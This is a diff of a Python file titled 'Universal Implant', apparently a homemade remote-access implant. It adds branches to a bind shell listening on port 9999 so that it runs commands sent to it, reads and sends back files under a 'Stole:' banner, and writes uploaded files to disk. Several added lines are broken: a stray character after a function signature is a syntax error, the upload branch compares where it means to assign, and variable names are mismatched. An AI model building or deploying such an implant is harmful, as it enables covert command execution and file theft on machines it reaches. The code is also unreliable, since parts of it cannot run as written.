@@ -7,20 +7,19 @@ import socket
 '''Universal Implant Christian'''
 
 #upload
-def upload_file(b64_in: str, dest_file: str) -> None:
+def upload_file(b64_in: bytes, dest_file: str) -> None:
+
     b64DecodeUp = base64.b64decode(b64_in)
     with open(dest_file, "wb") as f:
         f.write(b64DecodeUp)
     return
 
 #download
-def download_file(fileToDL: str) -> bytes:
-     b64EncDL = base64.b64encode(fileToDL.encode('utf-8'))
-     with open(fileToDL, "rb") as f:
-         DLFile = f.read()  
-     print('stole ' + fileToDL)
-     print(b64EncDL.decode('utf-8'))
-     return b64EncDL
+def download_file(fileToDL: str) -> bytes:s
+    with open(fileToDL, "rb") as f:
+        DLFile = f.read()  
+    b64_DLFile_Encoded = base64.b64encode(DLFile)
+    return b64_DLFile_Encoded
 
 #execute
 def execute(command: str) -> bytes:
@@ -29,7 +28,7 @@ def execute(command: str) -> bytes:
         exe_command = proc.stdout.read().strip()
     return bytes(exe_command)
 
-#bind shell
+#bind shell 
 def bindShell() -> None:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind(("127.0.0.1", 9999))
@@ -57,22 +56,33 @@ def bindShell() -> None:
                 #recv execute
                 if args[0] == execute_param:
                     exec_command = args[1]
-                    test = (
+                    execute_send = (
                         ('Executed '+exec_command+':\n'+'-'*20+'output'+'-'*20+'\n').encode('utf-8')+
                     execute(exec_command)+
                     ('\n'+'-'*20+'output'+'-'*20+'\n\n').encode('utf-8')
                     )
-                    conn.sendall(test)
+                    conn.sendall(execute_send)
+
+                #download
+                elif args[0] == download_cmd:
+                    fileDL_command = args[1]
+                    fileDL_send = download_file(fileDL_command)
+                    message = (b"Stole: " + fileDL_command.encode('utf-8') + b'\n' + fileDL_send + b'\n' + b"-"*20 + b'\n')
+                    conn.send(message)
+
+                #upload 
+                elif args[0] == upload_cmd:
+                    fileUp == args[1]
+                    print(fileUp)
+                    fileUPdest == args[2].decode('utf-8')
+                    upload_file(fileUP, fileUPdest)
+                    conn.send(b'Uploaded '+fileUP)
 
 
                 
 		
 #main
 def main():
-    dest_file_out = "./test.txt"
-    fileUp = "./canitruncrysis.sh"
-    b64_test = "IyEvYmluL2Jhc2gKZWNobyBoZWxsbwo="
-    cmd = 'ifconfig'
     bindShell()
     return
 if __name__ == '__main__':
